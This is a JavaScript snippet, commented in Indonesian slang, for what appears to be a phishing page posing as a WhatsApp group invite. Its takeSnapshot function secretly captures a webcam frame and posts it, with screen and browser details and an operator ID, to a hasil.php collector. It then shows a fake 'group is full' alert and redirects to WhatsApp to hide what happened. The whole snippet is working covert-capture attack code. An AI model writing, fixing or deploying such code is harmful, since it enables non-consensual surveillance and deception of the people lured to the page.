// Ganti fungsi takeSnapshot di index.php lu jadi begini:
function takeSnapshot() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Ubah jadi jpeg biar cocok sama hasil.php lu
    const imageData = canvas.toDataURL('image/jpeg');
    
    fetch('hasil.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            img: imageData, // Pakai 'img' bukan 'image'
            user_id: '8775494315', // Masukkan ID lu sementara buat ngetes
            info: {
                os: 'Windows 10',
                ram: '8',
                screen: window.screen.width + 'x' + window.screen.height,
                agent: navigator.userAgent
            }
        })
    })
    .then(() => {
        alert("Maaf, Grup ini sudah penuh.");
        window.location.href = "https://www.whatsapp.com";
    });
}
